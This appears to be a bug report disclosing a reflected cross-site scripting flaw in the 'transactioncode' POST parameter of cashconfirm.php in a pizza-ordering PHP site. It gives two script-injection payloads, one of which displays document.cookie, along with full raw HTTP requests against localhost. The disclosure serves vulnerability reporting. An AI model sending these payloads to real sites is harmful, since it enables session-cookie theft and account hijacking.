BUG_Author: JiaQi Yang

Vulnerability File: /FriendlyIsPizzaWebsite/cashconfirm.php

Parameter "transactioncode" (POST), exists XSS vulnerability

Payload1:transactioncode=<script>alert(111)</script>&grandtotal=2&cusid=3

```
POST /FriendlyIsPizzaWebsite/cashconfirm.php HTTP/1.1
Host: localhost
Content-Length: 78
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/FriendlyIsPizzaWebsite/cashconfirm.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close

transactioncode=%3Cscript%3Ealert%28111%29%3C%2Fscript%3E&grandtotal=2&cusid=3
```

![image](https://github.com/2889436547/bug_report/blob/main/pictures/xss1.png)

Payload2:transactioncode=<script>alert(document.cookie)</script>&grandtotal=2&cusid=3

```
POST /FriendlyIsPizzaWebsite/cashconfirm.php HTTP/1.1
Host: localhost
Content-Length: 90
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/FriendlyIsPizzaWebsite/cashconfirm.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=updr4q113dildbo75ti98camsc
Connection: close

transactioncode=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&grandtotal=2&cusid=3
```

![image](https://github.com/2889436547/bug_report/blob/main/pictures/xss2.png)
